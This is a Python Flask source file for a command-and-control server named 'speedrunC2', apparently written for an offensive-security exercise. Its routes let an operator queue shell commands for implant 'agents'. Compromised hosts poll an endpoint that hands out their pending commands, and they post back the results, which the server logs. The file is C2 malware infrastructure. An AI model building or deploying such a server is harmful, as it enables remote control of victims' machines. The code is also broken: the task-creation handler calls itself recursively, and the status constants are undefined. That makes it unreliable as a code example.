from speedrunC2.app import app, db
from speedrunC2.models import Task, Agent
from speedrunC2.controllers import find_agent_by_id, make_job_id
from speedrunC2.wrappers import ch0nky_ua
from flask import request, jsonify

@app.route("/tasks/create", methods=["POST"])
def create_task():
    data = request.json
    if data == None:
        return jsonify({"status": "bad task!"})

    # error checking 
    task_type = data.get("type")
    task_command = data.get("cmd")
    agent_id = data.get("agent_id")
    agent = find_agent_by_id(agent_id)
    if agent == None:
        return jsonify({"status": "no agent with that ID"})
    task = create_task()
    
    print(f"[+] A new task has been created for {agent_id}")
    return jsonify({"status": "ok", "message": task.job_id})

@app.route("/tasks/list", methods=["GET"])
def list_tasks():
    tasks = Task.query.all()
    t = [{"job_id": i.job_id, "agent_id": i.agent_id, "status": i.Status, "type": i.command_type,"cmd": i.cmd} for i in tasks]
    return jsonify(t)

# we get get/recieve job reqeusts/response
@app.route("/tasks", methods = [ "POST"])
def tasking():
    data = request.json
    if data == None:
        return jsonify({"status": "Bad", "message": "boo you!"})
    
    job_id = data.get("job_id")
    agent_id = data.get("agent_id")
    task_result = data.get("task_response")
    if task_result:
        for response in task_result:
            t_job_id = response.get("job_id")
            t_job_resp = response.get("result")
            task = Task.query.filter_by(job_id = t_job_id).first()
            if task.Status != TASKED:
                print("[+] Possible replay attack!", task)
            else:
                print(f"[+] Agent responded to job {t_job_id} with result: {t_job_resp}" )
                task.Status = DONE
                db.session.commit()

            # we need to set the task to compiled 

    agent = find_agent_by_id(agent_id)

    # invalid agent 
    if agent == None:
        return jsonify({"status": "Bad", "message": "Bad agent!"})
    
    task = Task.query.filter_by(agent_id=agent_id, Status = CREATED).first()
    if task == None:
        # no work to be done
        return jsonify({})
    else:
        # have tasked the agent
        task.Status = TASKED
        db.session.commit()
        return jsonify({
            "status": "ok",
            "type": task.command_type, 
            "cmd": task.cmd,
            "job_id": task.job_id
        })
